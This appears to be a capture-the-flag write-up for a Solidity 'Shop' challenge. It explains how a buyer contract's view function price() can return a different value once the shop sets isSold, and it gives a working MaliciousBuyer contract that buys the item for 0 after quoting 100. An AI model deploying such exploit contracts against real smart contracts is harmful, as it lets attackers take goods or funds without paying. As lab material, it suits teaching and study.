# Answer

Goal: Mark contract as `isSold` true without paying full `price`.

## 1. Detecting second `price()` call

After first glance we can tell the price could be manipulated using `_buyer.price()`. But the interface restricts us from change in `price()` return value using state (what we did in "11-elevator" challenge). Fortunately the contract changes `isSold` value just before calling `price()` again and we can use that as an indicator without changing our own state.

## 2. Buy and change price

Using the information describe before, the malicious buyer contract looks like this:

```solidity
contract MaliciousBuyer is Buyer {
    Shop s;

    constructor(address targetAddr) {
        s = Shop(targetAddr);
    }

    function buy() external {
        s.buy();
    }

    function price() external override view returns (uint256) {
        return !s.isSold() ? 100 : 0;
    }
}

```
Once we call `buy()` of MaliciousBuyer the challenge will be solved.
